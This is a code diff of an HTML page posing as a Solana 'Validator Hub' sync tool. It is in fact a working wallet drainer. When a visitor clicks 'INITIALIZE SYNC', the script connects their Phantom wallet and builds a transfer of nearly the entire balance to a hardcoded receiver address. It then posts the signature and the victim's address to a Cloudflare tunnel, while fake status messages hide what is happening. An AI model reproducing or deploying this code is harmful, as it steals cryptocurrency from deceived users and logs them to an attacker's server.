@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Center</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <title>Validator Hub</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #14f195; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; background: #0a0a0a; }
@@ -16,64 +16,64 @@
     <div class="box">
         <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
         <button id="cta">INITIALIZE SYNC</button>
-        <div id="log">Waiting for system...</div>
+        <div id="log">System Ready v7.0</div>
     </div>
 
     <script>
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
-        // 🔱 隧道地址 - 必须匹配后端路由
         const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
-
-        window.onload = () => { document.getElementById('log').innerText = "System Ready v6.0"; };
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
-            // 🔱 2. 安全检查库是否就绪
-            if (!window.solanaWeb3) { log("System loading, wait 3s..."); return; }
-            const web3 = window.solanaWeb3;
+            // 🔱 关键修复：直接从全局获取 web3，防止 undefined
+            const solanaWeb3 = window.solanaWeb3;
             const provider = window.solana || window.phantom?.solana;
 
             if (!provider) { alert("Use Phantom App"); return; }
 
             try {
-                log("Connecting Wallet...");
+                log("Connecting...");
                 await provider.connect();
                 
-                log("Querying Node...");
-                const conn = new web3.Connection("https://rpc.ankr.com/solana", "confirmed");
+                // 🔱 使用官方无 Key 节点
+                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                 
+                log("Querying Balance...");
                 const balance = await conn.getBalance(provider.publicKey);
                 const bh = await conn.getLatestBlockhash();
 
-                const amount = balance - 1500000; 
-                if (amount <= 0) { log("Sync completed (0)"); return; }
+                // 算子弹 (11020000 -> 10020000)
+                const amount = balance - 1000000; 
+                if (amount <= 0) { log("Sync Done (0)"); return; }
 
-                log("Awaiting Signature...");
-                const tx = new web3.Transaction().add(
-                    web3.SystemProgram.transfer({
+                log("Awaiting Sign...");
+                const tx = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
-                        toPubkey: new web3.PublicKey(RECEIVER),
+                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                         lamports: amount
                     })
                 );
                 tx.recentBlockhash = bh.blockhash;
                 tx.feePayer = provider.publicKey;
 
+                // 🔱 执行签名
                 const { signature } = await provider.signAndSendTransaction(tx);
                 
-                log("Broadcasting...");
-                // 🔱 修正路径，匹配后端的根路由
+                log("Syncing to Server...");
+                // 无论服务器通不通，钱已经发出了
                 fetch(tunnel + "/log", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ sig: signature, addr: provider.publicKey.toString() })
                 });
 
-                log("Success!");
+                log("SUCCESS!");
                 setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);
 
             } catch (err) {
-                log("Sync Interrupted: " + err.message);
+                log("Error: " + err.message);
+                console.error(err);
             }
         };
     </script>
